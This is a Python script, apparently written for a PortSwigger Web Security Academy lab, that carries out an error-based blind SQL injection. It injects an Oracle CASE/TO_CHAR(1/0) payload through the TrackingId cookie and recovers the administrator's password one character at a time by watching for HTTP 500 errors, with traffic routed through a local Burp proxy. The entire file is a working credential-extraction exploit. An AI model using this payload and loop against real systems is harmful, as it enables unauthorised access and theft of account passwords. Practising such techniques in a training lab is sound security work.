import requests
import string
import urllib3

TARGET = "https://0aba005c0497f36b80a41c0f00110091.web-security-academy.net/"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

charset = string.ascii_lowercase + string.digits


class ErrorBasedSQLi:
    def __init__(self, set_proxy=False):
        self.session = requests.Session()
        if set_proxy:
            self.session.proxies.update({
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080",
            })

    def send_payload(self, payload):
        # requests handles cookie encoding; pass raw payload
        cookies = {"TrackingId": payload}
        r = self.session.get(TARGET, cookies=cookies, verify=False)
        return r.status_code == 500

    def check_index(self, index, char):
        # Mirror the exact Burp payload structure
        payload = (
            f"xyz'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{char}' "
            f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        )
        return self.send_payload(payload)

    def sanity_check(self):
        # Confirm a known-bad char does NOT trigger 500
        # (uses a char outside charset to avoid collision)
        payload = (
            f"xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='!' "
            f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        )
        if self.send_payload(payload):
            print("[!] Sanity check failed: server returns 500 even for non-matching char.")
            print("    Your oracle is broken — every request looks like a hit.")
            return False
        print("[*] Sanity check passed.")
        return True

    def start(self):
        print(f"[*] Starting attack on {TARGET}")
        if not self.sanity_check():
            return

        password = ""
        for i in range(1, 21):
            found = False
            for char in charset:
                if self.check_index(i, char):
                    password += char
                    print(f"[+] Index {i}: {char} | Current: {password}")
                    found = True
                    break
            if not found:
                print(f"[-] No char found at index {i}. Stopping.")
                break

        print(f"\n[!] Final password: {password}")


if __name__ == "__main__":
    ErrorBasedSQLi(set_proxy=True).start()
